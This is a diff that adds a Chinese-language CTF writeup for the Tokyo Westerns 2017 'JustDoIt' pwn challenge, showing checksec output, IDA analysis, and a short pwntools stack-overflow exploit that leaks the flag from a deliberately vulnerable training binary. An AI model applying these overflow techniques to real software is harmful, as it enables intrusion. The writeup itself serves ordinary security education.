@@ -1,7 +1,7 @@
 ---
 title: 'Writeups: Nightmare Series'
 date: '2024-07-24'
-lastmod: '2024-07-26'
+lastmod: '2024-07-27'
 tags: ['CTF','Writeup', 'Pwn', 'Nightmare']
 draft: false
 summary: 'Writeups for Nightmare Series'
@@ -285,3 +285,109 @@ target.interactive()
 ### Flag
 
 Flag: `flag{g0ttem_b0yz}`
+
+## Tokyo Westerns CTF 3rd 2017 JustDoIt
+
+### Information
+
+ - Category: Pwn
+ - Points: Unknow
+
+### Description
+
+> Unknow
+
+<Download name="just_do_it" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/04-bof_variable/tw17_justdoit/just_do_it" type="Binary" />
+
+### Writeup
+
+```plain-text
+λ ~/ file just_do_it
+just_do_it: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=cf72d1d758e59a5b9912e0e83c3af92175c6f629, not stripped
+λ ~/ pwn checksec just_do_it
+[*] '/home/cub3y0nd/just_do_it'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+```plain-text
+λ ~/ ./just_do_it
+Welcome my secret service. Do you know the password?
+Input the password.
+aaaa
+Invalid Password, Try Again!
+```
+
+可能是要获得密码打印 `flag`，丢到 IDA 看看：
+
+<center>
+  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/27/pkqmom8.png" width={1920} height={1080} />
+</center>
+
+看伪代码发现，就算提供了正确的密码也只是输出一条消息而已，得到密码好像并没有什么用。这就是一个障眼法！
+
+<center>
+  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/27/pkqmLfs.png" width={1920} height={1080} />
+</center>
+
+虽然不需要密码，但是如果你好奇密码的话，也不是不行... 通过 IDA 我们知道密码是 `P@SSW0RD`，于是乎：
+
+<center>
+  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/27/pkqn97F.png" width={1920} height={1080} />
+</center>
+
+这里即使有了正确的密码还是提示密码错误的原因是 `fgets` 函数会把换行符也读进去。所以我们只需要在密码后面加上空字符 `\0` 就可以去掉换行符了。
+
+<center>
+  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/27/pkqnp0U.png" width={1920} height={1080} />
+</center>
+
+扯远了...
+
+通过之前的伪代码可以发现，`fgets` 接收的输入大小远超 `input` 可容纳的大小。因此通过调试可以知道溢出 padding 是 20 字节：
+
+<center>
+  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/27/pkqnApR.png" width={1920} height={1080} />
+</center>
+
+那么有了溢出 padding 后怎么获取 flag 呢？
+
+由伪代码知，它会从 `stream` 里面读取 48 字节的数据，保存到 `flag` 变量里面。那么我们如果可以直接输出 `flag` 就好了。这里有一个思路是利用之前的溢出漏洞，将 `input` 填满后把 `flag` 变量的地址溢出给 `v6`，这就会导致 `puts` 输出 `flag` 变量的内容。perfect
+
+嗯...这样就很清晰了。通过 IDA 直接看 `flag` 在 `.bss` 中的地址：
+
+<center>
+  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/27/pkqnQtH.png" width={1920} height={1080} />
+</center>
+
+当然，如果你想验证它是不是真我们所想覆盖了 `v6` 让 `puts` 输出 `flag` 的内容：
+
+<center>
+  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/27/pkqntnf.png" width={1920} height={1080} />
+</center>
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import *
+
+context(os='linux', arch='amd64', log_level='debug')
+
+target = process('./just_do_it')
+
+payload = b'A' * 0x14 + p32(0x0804A080)
+
+target.sendline(payload)
+target.interactive()
+```
+
+### Flag
+
+Flag: `TWCTF{pwnable_warmup_I_did_it!}`
+
+
